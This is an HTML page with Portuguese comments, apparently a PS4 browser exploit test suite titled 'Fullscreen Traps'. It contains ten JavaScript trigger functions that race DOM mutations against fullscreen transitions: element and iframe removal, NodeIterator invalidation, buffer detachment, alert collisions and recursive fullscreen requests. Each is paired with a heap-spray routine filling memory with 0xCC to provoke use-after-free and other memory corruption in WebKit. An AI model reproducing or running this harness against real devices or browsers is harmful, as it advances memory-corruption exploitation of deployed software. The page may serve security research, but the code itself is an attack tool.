<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v170000: Fullscreen Traps</title>
<style>
    body { background: #000; color: #ff0; font-family: sans-serif; padding: 20px; }
    .btn { 
        display: block; width: 100%; padding: 15px; margin: 10px 0; 
        background: #330; color: #fff; border: 1px solid #ff0; 
        font-size: 18px; cursor: pointer;
    }
    #msg { 
        background: #f00; color: #fff; padding: 10px; 
        font-weight: bold; text-align: center; display: none; 
        border: 3px solid #fff; font-size: 20px;
    }
    #log { border: 1px solid #ff0; height: 200px; overflow-y: scroll; margin-top: 20px; color: #0f0; font-family: monospace; }
    /* Área alvo para fullscreen */
    #stage { background: #222; width: 100px; height: 100px; margin: 10px; border: 1px solid #555; }
</style>
</head>
<body>

<h1>v170000: FULLSCREEN TRAPS</h1>
<div id="msg">⚠️ AGORA: APERTE QUADRADO [] NO CONTROLE! ⚠️</div>
<div id="stage">ALVO</div>
<div id="log">Sistema pronto.</div>

<button class="btn" onclick="arm(f01)">01. Element Remove during Transition (UAF)</button>
<button class="btn" onclick="arm(f02)">02. Video Track Text Mutation Race</button>
<button class="btn" onclick="arm(f03)">03. Canvas Buffer Detach on Resize</button>
<button class="btn" onclick="arm(f04)">04. Iframe Destruction (Context Kill)</button>
<button class="btn" onclick="arm(f05)">05. History Back Navigation Race</button>
<button class="btn" onclick="arm(f06)">06. Alert/Prompt UI Layer Conflict</button>
<button class="btn" onclick="arm(f07)">07. CSS Display:None Switcheroo</button>
<button class="btn" onclick="arm(f08)">08. SVG ForeignObject Layout Thrash</button>
<button class="btn" onclick="arm(f09)">09. NodeIterator Invalidation on Resize</button>
<button class="btn" onclick="arm(f10)">10. Recursive Request Flood</button>

<script>
    const L = document.getElementById('log');
    const M = document.getElementById('msg');
    const S = document.getElementById('stage');
    
    function log(m) { L.innerHTML += "> " + m + "\n"; L.scrollTop = L.scrollHeight; }

    // Função de Preparação da Armadilha
    function arm(trapFunction) {
        // 1. Limpa o palco
        S.innerHTML = "";
        S.style.display = "block";
        
        // 2. Executa a preparação específica do teste
        log("Armando armadilha: " + trapFunction.name);
        const targetElement = trapFunction(S);
        
        // 3. Define o gatilho
        const trigger = () => {
            log("⚡ EVENTO FULLSCREEN DETECTADO! DETONANDO...");
            // Executa a lógica destrutiva
            if (targetElement && targetElement._detonate) {
                try { targetElement._detonate(); } 
                catch(e) { log("Erro na detonação: " + e.message); }
            }
            M.style.display = "none";
        };

        // Escuta por mudanças de tela cheia (Standard e WebKit prefix)
        document.onfullscreenchange = trigger;
        document.onwebkitfullscreenchange = trigger;
        
        // 4. Pede interação do usuário
        M.style.display = "block";
        log("AGUARDANDO USUÁRIO ACIONAR FULLSCREEN...");
        
        // Tenta focar no elemento para ajudar o PS4 a saber o que expandir
        if(targetElement) targetElement.focus();
    }

    // =================================================================
    // 01. Element Remove during Transition
    // Remove o elemento do DOM no exato momento que o motor gráfico
    // está tentando calcular o tamanho da tela cheia.
    // =================================================================
    function f01(stage) {
        const d = document.createElement('div');
        d.innerHTML = "<h1>ALVO DE MORTE</h1>";
        d.style.backgroundColor = "red";
        d.tabIndex = 0; // Tornar focável
        stage.appendChild(d);

        d._detonate = () => {
            log("Removendo elemento do DOM...");
            d.remove(); 
            pressure(); // Heap Spray imediato para ocupar o lugar
        };
        return d;
    }

    // =================================================================
    // 02. Video Track Text Mutation Race
    // O PS4 usa um player nativo overlay para vídeo. 
    // Manipular legendas durante a transição ataca a interface entre WebKit e Player.
    // =================================================================
    function f02(stage) {
        const v = document.createElement('video');
        v.src = "http://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4"; // Sample video
        v.controls = true;
        const track = v.addTextTrack("subtitles", "Crash", "en");
        track.mode = "showing";
        track.addCue(new VTTCue(0, 100, "TESTE"));
        stage.appendChild(v);

        v._detonate = () => {
            log("Corrompendo lista de Cues...");
            // Remove o track e modifica os cues enquanto o player expande
            track.mode = "disabled";
            v.innerHTML = ""; // Nuke children
            pressure();
        };
        return v;
    }

    // =================================================================
    // 03. Canvas Buffer Detach on Resize
    // Transfere o buffer do Canvas para um Worker no momento do resize.
    // =================================================================
    function f03(stage) {
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        ctx.fillStyle = 'blue'; ctx.fillRect(0,0,100,100);
        const imgData = ctx.getImageData(0,0,100,100);
        c.tabIndex = 0;
        stage.appendChild(c);

        const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{}"],{type:'text/javascript'})));

        c._detonate = () => {
            log("Transferindo Buffer (Detach)...");
            // Tenta roubar o buffer da GPU
            w.postMessage(imgData.data.buffer, [imgData.data.buffer]);
            // Força repaint
            ctx.putImageData(imgData, 0, 0); 
        };
        return c;
    }

    // =================================================================
    // 04. Iframe Destruction (Context Kill)
    // Coloca um iframe em fullscreen e mata o iframe.
    // =================================================================
    function f04(stage) {
        const ifr = document.createElement('iframe');
        ifr.srcdoc = "<h1 style='color:red'>EXPANDA-ME</h1>";
        stage.appendChild(ifr);

        ifr._detonate = () => {
            log("Matando Iframe...");
            ifr.remove();
            pressure();
        };
        return ifr;
    }

    // =================================================================
    // 05. History Back Navigation Race
    // Força o navegador a voltar a página anterior enquanto entra em fullscreen.
    // Confunde o gerenciador de visualização (View Manager).
    // =================================================================
    function f05(stage) {
        const d = document.createElement('div');
        d.innerText = "History Trap";
        d.tabIndex = 0;
        stage.appendChild(d);
        
        // Push state para ter para onde voltar
        history.pushState({}, "trap", "#trap");

        d._detonate = () => {
            log("Navegando para trás (Back)...");
            history.back();
        };
        return d;
    }

    // =================================================================
    // 06. Alert/Prompt UI Layer Conflict
    // O PS4 tem uma camada UI para alertas e outra para Fullscreen.
    // Colidi-las pode causar deadlock ou crash.
    // =================================================================
    function f06(stage) {
        const d = document.createElement('div');
        d.innerText = "UI Conflict";
        d.tabIndex = 0;
        stage.appendChild(d);

        d._detonate = () => {
            log("Spamando Alertas...");
            // O alert bloqueia a thread JS, mas o fullscreen é nativo.
            // O conflito de quem tem o foco pode crashar a UI.
            alert("CRASH ATTEMPT"); 
            alert("CRASH ATTEMPT 2");
        };
        return d;
    }

    // =================================================================
    // 07. CSS Display:None Switcheroo
    // Oculta o elemento via CSS enquanto ele vira tela cheia.
    // =================================================================
    function f07(stage) {
        const d = document.createElement('div');
        d.style.backgroundColor = "green";
        d.innerText = "Hide & Seek";
        d.tabIndex = 0;
        stage.appendChild(d);

        d._detonate = () => {
            log("Aplicando display: none...");
            d.style.display = "none";
            // Força layout recalc
            document.body.offsetWidth;
            pressure();
        };
        return d;
    }

    // =================================================================
    // 08. SVG ForeignObject Layout Thrash
    // SVG dentro de HTML dentro de SVG em tela cheia.
    // =================================================================
    function f08(stage) {
        const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        svg.setAttribute("viewBox", "0 0 100 100");
        const fo = document.createElementNS("http://www.w3.org/2000/svg", "foreignObject");
        fo.setAttribute("width", "100"); fo.setAttribute("height", "100");
        const d = document.createElement("div");
        d.innerText = "SVG TRAP";
        fo.appendChild(d);
        svg.appendChild(fo);
        svg.tabIndex = 0;
        stage.appendChild(svg);

        svg._detonate = () => {
            log("Alterando atributos SVG...");
            fo.setAttribute("width", "0");
            fo.remove();
        };
        return svg;
    }

    // =================================================================
    // 09. NodeIterator Invalidation on Resize
    // Cria um iterador e invalida durante o evento de resize (parte do fullscreen).
    // =================================================================
    function f09(stage) {
        const root = document.createElement('div');
        root.innerHTML = "<span>A</span><span>B</span><span>C</span>";
        root.tabIndex = 0;
        stage.appendChild(root);
        
        const ni = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT);
        ni.nextNode(); // Ativa

        root._detonate = () => {
            log("Invalidando Iterador...");
            root.innerHTML = ""; // Mata nós
            pressure();
            try { ni.nextNode(); } catch(e){} // Acesso UAF
        };
        return root;
    }

    // =================================================================
    // 10. Recursive Request Flood
    // Tenta pedir fullscreen novamente DENTRO do evento de fullscreen.
    // =================================================================
    function f10(stage) {
        const d = document.createElement('div');
        d.innerText = "Recursion";
        d.tabIndex = 0;
        stage.appendChild(d);

        d._detonate = () => {
            log("Loop de Requisição...");
            // Tenta forçar estado inconsistente de flag
            if(d.webkitRequestFullscreen) d.webkitRequestFullscreen();
            if(d.webkitExitFullscreen) d.webkitExitFullscreen();
        };
        return d;
    }

    // Helper: Heap Spray
    function pressure() {
        const arr = [];
        for(let i=0; i<500; i++) arr.push(new Uint8Array(1024*64).fill(0xCC));
    }

</script>
</body>
</html>
